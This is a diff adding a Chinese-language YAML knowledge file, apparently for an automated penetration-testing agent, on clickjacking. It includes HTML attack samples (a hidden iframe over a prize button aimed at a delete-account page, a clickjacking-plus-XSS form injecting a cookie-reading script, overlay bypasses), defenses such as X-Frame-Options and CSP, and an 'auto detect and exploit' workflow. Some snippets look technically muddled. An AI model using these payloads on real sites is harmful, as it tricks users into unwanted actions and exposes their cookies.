@@ -1,0 +1,121 @@
+name: "点击劫持攻击"
+description: "点击劫持漏洞检测和利用"
+domain: "web"
+version: "1.0"
+tags:
+  - web
+  - clickjacking
+  - ui
+
+knowledge: |
+  # 点击劫持补充
+  
+  ## 1. 基础点击劫持
+  
+  ### 原理
+  
+  利用透明iframe覆盖在合法按钮上，诱导用户点击
+  
+  ### 示例
+  
+  ```html
+  <html>
+  <head>
+  <title>Clickjack Attack</title>
+  </head>
+  <body>
+    <iframe src="http://target.com/delete-account" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;">
+    <button>Click to Win Prize!</button>
+  </body>
+  </html>
+  ```
+  
+  ---
+  
+  ## 2. 点击劫持+XSS
+  
+  ### 组合利用
+  
+  ```html
+  <iframe src="http://target.com/post" style="opacity:0; position:absolute; top:0; left:0;">
+  <form action="http://target.com/post" method="POST" id="pwn">
+  <input type="hidden" name="content" value="<script>alert(document.cookie)</script>">
+  </form>
+  <script>document.getElementById('pwn').submit();</script>
+  </iframe>
+  ```
+  
+  ---
+  
+  ## 3. 绕过技术
+  
+  ### 多层iframe
+  
+  ```html
+  <iframe src="page1.html" style="opacity:0">
+    <iframe src="page2.html" style="opacity:0">
+      <iframe src="target.html">
+      </iframe>
+    </iframe>
+  </iframe>
+  ```
+  
+  ### CSS覆盖
+  
+  ```html
+  <div style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999;">
+    <button>Win Prize!</button>
+  </div>
+  <iframe src="http://target.com/action" style="opacity:0;">
+  ```
+  
+  ---
+  
+  ## 4. 防御措施
+  
+  ### Frame busting
+  
+  ```javascript
+  if (top !== self) {
+    top.location = self.location;
+  }
+  ```
+  
+  ### X-Frame-Options
+  
+  ```
+  X-Frame-Options: DENY
+  X-Frame-Options: SAMEORIGIN
+  X-Frame-Options: ALLOW-FROM https://example.com
+  ```
+  
+  ### CSP
+  
+  ```
+  Content-Security-Policy: frame-ancestors 'self';
+  ```
+  
+
+workflows:
+  - name: "自动检测和利用"
+    description: "自动检测漏洞并尝试利用"
+    steps:
+      - description: "信息收集和漏洞探测"
+        expected_output: "发现潜在漏洞点"
+      - description: "漏洞验证"
+        expected_output: "确认漏洞存在"
+      - description: "漏洞利用"
+        expected_output: "成功利用漏洞"
+
+tool_preferences:
+  nmap:
+    score: 0.8
+    reason: "端口和服务扫描"
+  nuclei:
+    score: 0.9
+    reason: "漏洞扫描"
+
+examples:
+  - scenario: "发现漏洞并获取敏感信息"
+    solution: "使用工具探测 -> 验证漏洞 -> 获取数据"
+    tools_used: ["nmap", "nuclei"]
